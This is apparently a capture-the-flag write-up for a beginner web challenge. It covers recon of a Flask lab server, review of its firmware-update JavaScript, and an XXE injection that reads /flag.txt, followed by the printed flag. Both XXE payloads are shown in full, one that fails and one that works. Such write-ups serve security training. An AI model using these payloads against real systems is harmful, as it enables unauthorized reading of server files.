# Challenge: Jailbreak (Web)

## Challenge Overview

**Name:** Jailbreak
**Category:** Web
**Difficulty:** Very Easy

### Description:

The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt

---

# Challenge Progress: JailbreaK 

## Recon & Enumeration

### Initial Scanning

```bash
whatweb http://94.237.60.55:31755
```

**Result:**

- Server: Werkzeug (Python 3.12.3)
- Framework: Flask
- Tech stack: Bootstrap, jQuery, HTML5
- Title: PIP-OS(R) V1.33.7

---

## Content Discovery

Manual browsing revealed several interesting endpoints:

- `/flag.txt` → Forbidden
- `/console`, `/debug`, `/vault`, `/firmware`, `/api/`, `/rom` → Some accessible
- `/rom` → Firmware update interface

---

## Source Code Review

Found JS file: `/static/js/update.js`

```javascript
const queueUpdate = async (xmlConfig) => {
    const response = await fetch("/api/update", {
        method: "POST",
        headers: {
            "Content-Type": "application/xml",
        },
        body: xmlConfig
    });
    return await response.json();
};

window.onload = async () => {
    const xmlConfiguration = `<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    </FirmwareUpdateConfig>`;
    $("#configData").val(xmlConfiguration);

    $("#updateBtn").on("click", async () => {
        const msg = await queueUpdate($("#configData").val());
        $("#messageText").text(msg.message);
    });
};
```

This confirms XML is parsed server-side → **XXE attack vector**.

---

## Exploitation - XXE Injection

### Failed Attempt

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root><data>&xxe;</data></root>
```

**Error:**
```
The root element must be 'FirmwareUpdateConfig'.
```

### Working Payload

```xml
<!DOCTYPE FirmwareUpdateConfig [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <ReleaseDate>2077-10-21</ReleaseDate>
    <Description>Test</Description>
    <Checksum type="SHA-256">abc</Checksum>
  </Firmware>
</FirmwareUpdateConfig>
```

This payload successfully triggered the file read from `/flag.txt`.

---

## 🏁 Flag

```
HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_d22128d8ecb3f9f9a45cdb341917fb5b}
```

GOODD GUYSSSS~